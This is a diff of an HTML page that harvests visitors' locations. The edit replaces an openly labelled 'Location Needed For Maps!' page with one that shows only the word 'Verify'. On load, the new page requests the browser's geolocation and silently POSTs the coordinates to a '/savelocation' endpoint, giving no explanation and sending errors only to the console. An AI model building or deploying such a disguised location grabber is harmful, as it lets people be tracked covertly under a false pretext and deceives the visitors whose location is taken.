@@ -13,54 +13,44 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .container {
             text-align: center;
         }
+        #verify {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
     </style>
+</head>
+<body>
+    <div class="container">
+        <div id="verify">Verify</div>
+    </div>
     <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(savePosition, showError);
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        }
-
-        function savePosition(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const url = `/save-location?lat=${lat}&lon=${lon}`;
-
-            fetch(url)
-                .then(response => response.text())
-                .then(data => {
-                    alert(data);
-                    // Redirect after saving location
-                    window.location.href = "https://satellite-map.com/m/?gad_source=1&gclid=CjwKCAjwk8e1BhALEiwAc8MHiPka5Y8pO6Ag4OKa7RDm8BkBcvhsXXnLoe5DPCGr_AdleT6aiGZEpRoCPikQAvD_BwE";
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
-        }
-
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    alert("User denied the request for Geolocation.");
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    alert("Location information is unavailable.");
-                    break;
-                case error.TIMEOUT:
-                    alert("The request to get user location timed out.");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    alert("An unknown error occurred.");
-                    break;
-            }
+        // Request for location permission
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude } = position.coords;
+                    fetch('/savelocation', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ latitude, longitude }),
+                    }).catch((error) => {
+                        console.error('Error saving location:', error);
+                    });
+                },
+                (error) => {
+                    console.error('Error getting location:', error);
+                }
+            );
+        } else {
+            console.error('Geolocation is not supported by this browser.');
         }
     </script>
-</head>
-<body onload="getLocation()">
-    <h1>Location Needed For Maps!</h1>
 </body>
 </html>
